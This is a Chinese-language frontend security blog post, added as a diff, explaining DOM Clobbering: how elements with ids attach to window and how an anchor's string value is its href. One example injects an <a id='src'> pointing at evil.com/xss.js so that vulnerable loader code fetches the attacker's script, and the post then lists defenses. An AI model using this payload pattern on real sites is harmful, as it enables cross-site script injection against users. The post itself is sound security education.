@@ -1,0 +1,109 @@
+---
+title: 前端資安宇宙（四）- HTML 也能影響JavaScript?
+date: '2025-06-23'
+tags: ['資安', 'XSS', '前端']
+draft: false
+summary: 'HTML只能一個單純的標記語言？，還可以拿來執行JavaScript呢！'
+---
+
+## 前言
+
+你可能覺得：「XSS 不就是 `<script>alert(1)</script>` 那種老掉牙的東西嗎？」
+
+其實不然 —— 在某些狀況下，攻擊者**甚至不用寫 `<script>`**，只要插入一段普通的 HTML，加上一點 JavaScript 邏輯失誤，就可能觸發 **XSS 攻擊**。
+
+這篇文章帶你了解一些看似無害但其實危險的瀏覽器特性，例如：
+
+- 用 `window.id` 就能抓到 DOM？
+- 為什麼 `<a>` 轉成字串會變網址？
+- 怎麼用「DOM Clobbering」結合上面這些來做出 XSS？
+
+---
+
+## 用 `window` 就能抓到 DOM？
+
+讓我們看看以下寫法
+
+```jsx
+<button id="btn">Click me</button>
+
+<script>
+   console.log(window.btn) //<button id="btn">Click me</button>
+
+
+//window.btn === document.getElementById('btn')  ✅ true
+</script>
+
+```
+
+看起來就像是少了 document.getElementById，但卻能正常運作。這是因為：瀏覽器會把具有 id 的 DOM 元素自動掛到 window 上當成變數。
+雖然看起來很方便，但這樣的「貼心設計」其實是個雙面刃，因為它讓我們的變數命名與 DOM 結構產生了不明顯的耦合關係，不小心就可能被污染！
+
+## 為什麼 `<a>` 轉成字串會變網址？
+
+我們先來看看其他 DOM 元素轉字串時的行為是什麼：
+
+```html
+<div id="box"></div>
+<script>
+  console.log(String(window.box)) // [object HTMLDivElement]
+</script>
+```
+
+以上的範例結合剛剛的特殊抓取DOM的方式抓取`<div>`，這是我們預期的結果，DOM 元素轉成字串時，會變成像 [object HTMLDivElement] 這樣的字串。
+
+但接下來，我們來看看一個非常「不一樣」的例子 —— `<a>` 標籤。
+
+```html
+<a id="link" href="https://example.com"></a>
+<script>
+  console.log(String(window.link)) // https://example.com
+</script>
+```
+
+你沒有看錯，這次輸出的是一段完整的網址，而不是像剛剛一樣的 object HTMLAnchorElement。
+這是因為 `<a>` 是個特殊案例：它的 toString() 方法會自動回傳它的 .href 值
+
+## 怎麼用「DOM Clobbering」結合上面這些來做出 XSS？
+
+我們已經知道：
+
+1. 瀏覽器會把 `id="xxx"` 的元素自動掛到 `window.xxx`
+2. `<a>` 元素轉成字串時，會變成它的 `.href` 網址
+
+這兩件事單獨來看沒什麼，但**如果 `<a>` 的 `id` 被設計成和你 JS 裡的變數一樣，就會造成變數污染！**
+
+---
+
+來看看以下範例
+
+```html
+<a id="src" href="https://evil.com/xss.js"></a>
+
+<script>
+  if (window.src) {
+    const script = document.createElement('script')
+
+    // 這裡的 src 實際是 <a> 元素，但會被轉成字串
+    script.src = src
+
+    document.body.appendChild(script)
+  }
+</script>
+```
+
+發生了什麼？
+
+- `<a id="src">` 讓 `window.src === <a>` 成立
+- script.src = src 實際會變成 script.src = src.toString() → 等於 script.src = src.href
+- src.href 是攻擊者控制的網址，成功載入惡意 script！
+
+## 如何防範 DOM Clobbering XSS？
+
+DOM Clobbering 的核心問題是：**使用者插入的 HTML 結構，干擾了 JavaScript 的變數或函式行為。**  
+以下是幾個實務上能有效防止這類問題的方式：
+
+1. 不要依賴 `window.id` 自動綁定 DOM
+2. 請明確使用 DOM API
+3. 加上 CSP（Content Security Policy）
+4. [DOMPurify]('https://github.com/cure53/DOMPurify')
